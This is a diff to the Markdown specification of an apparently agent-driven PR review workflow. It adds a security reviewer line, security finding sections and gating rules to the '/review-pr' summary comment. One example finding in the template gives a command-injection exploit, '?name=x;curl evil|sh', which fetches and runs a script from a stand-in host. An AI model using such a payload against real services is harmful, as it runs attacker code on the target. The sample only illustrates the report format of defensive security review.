@@ -488,17 +488,23 @@ The `/finalize-pr` review comment carries no code-review and no spec-drift secti
 ## The `/review-pr` summary comment
 
 `/review-pr` posts one issue comment per run, never edits an earlier one, and is the only skill that
-marks a PR ready. The first line, the `Head:` and `Reviewer:` lines, and the `###` headings are read
-by machines; keep their spelling.
+marks a PR ready. The first line, the `Head:`, `Reviewer:` and `Security:` lines, and the `###`
+headings are read by machines; keep their spelling.
 
 ```markdown
 ## /review-pr — {Ready | Draft}
 
 Head: `{the reviewed head commit, first 7}`
 Reviewer: `{the project agent's frontmatter name, or code-review}` — {approved | changes_requested}, {C} Critical, {H} High
+Security: `{vendor} ({model})` — {C} Critical, {H} High, {M} Medium, {L} Low
 
 ### Blocking findings
 - High — `src/auth/client.ts:88` — the token is logged in plain text
+- Security High — `api/export.py:41` — the `name` query parameter reaches a shell; exploit: `?name=x;curl evil|sh`
+- (or "None.")
+
+### Security findings (not blocking)
+- Medium — `path:line` — {the vulnerability}; exploit: {scenario}
 - (or "None.")
 
 ### Spec drift (advisory)
@@ -509,10 +515,17 @@ Reviewer: `{the project agent's frontmatter name, or code-review}` — {approved
 {Marked ready. | Left as a draft: {why}. | Returned to draft: {why}.}
 
 <details><summary>Full reviewer report</summary> … </details>
+<details><summary>Full security report</summary> … </details>
 ```
 
-`Ready` means the reviewer named on the `Reviewer:` line reviewed the commit on the `Head:` line,
-nothing it found blocks, and the PR read back as ready before the comment was posted. A later push needs a later summary: an earlier `Ready` says nothing about a
+The `Security:` line names the entry of the Security reviewers list that produced the security
+review, never one that was skipped or returned nothing. Its counts are of findings in this PR: a
+stacked PR's floor review that lands outside this PR's changed paths is listed under the security
+findings as outside this PR, and not counted.
+
+`Ready` means the reviewer named on the `Reviewer:` line and the security reviewer named on the
+`Security:` line both reviewed the commit on the `Head:` line, nothing either found blocks, and the
+PR read back as ready before the comment was posted. A later push needs a later summary: an earlier `Ready` says nothing about a
 commit it did not see.
 
 ## The port block
@@ -643,15 +656,27 @@ review can put vendors in different orders.
 - **The vendors are `codex`, `google` and `claude`**, dispatched through the subagents and checked
   against the requirements in the Critics table above. Any other vendor stops the run.
 - **The last entry is the floor and must name `claude`.** For a security review, that entry is
-  Claude Code's built-in security review. A list ending in any other vendor has no floor, and
-  `/review-pr` stops rather than discovering it halfway down the chain.
+  Claude Code's built-in security review, the `security-review` skill, run in a fresh subagent on
+  the entry's model. A list ending in any other vendor has no floor, and `/review-pr` stops rather
+  than discovering it halfway down the chain.
 - **The order is the repo's choice.** `/setup-workflow` writes the same default order as Critics,
   for a new file and when it adds the list to an existing file that lacks it. It never reorders a
   list that is already there.
 
 **A missing list means the Claude floor runs.** `/review-pr` does not borrow the Critics list in its
-place: it runs Claude's built-in security review, and says once that `/setup-workflow` adds the
-list.
+place: it runs Claude's built-in security review on its own session's model, and says once that
+`/setup-workflow` adds the list.
+
+**What the entry reviews, and how its findings gate.** The entry that runs reviews the PR's diff
+against its base at the head commit the code reviewer reviews, read-only, at the same time as the
+code reviewer. It reports only vulnerabilities with real exploitation potential, each graded
+Critical, High, Medium or Low with a `path:line` and a concrete exploit scenario. A Critical or High
+finding blocks, exactly as a code-reviewer Critical or High does: the PR stays a draft. Medium and
+Low are listed and never block. An entry that returns no graded result is skipped by the
+chain-walking rules, and when no entry produces one, `/review-pr` stops and the PR stays a draft.
+
+`/review-pr` reads the list through `scripts/security-reviewers.py`, which holds the rules above
+that a file can break.
 
 Written by `/setup-workflow`. The Critics list is read by `/critique-spec` and by nothing else; the
 Security reviewers list by `/review-pr` and by nothing else; the Specs line by `/dispatch-slices`,
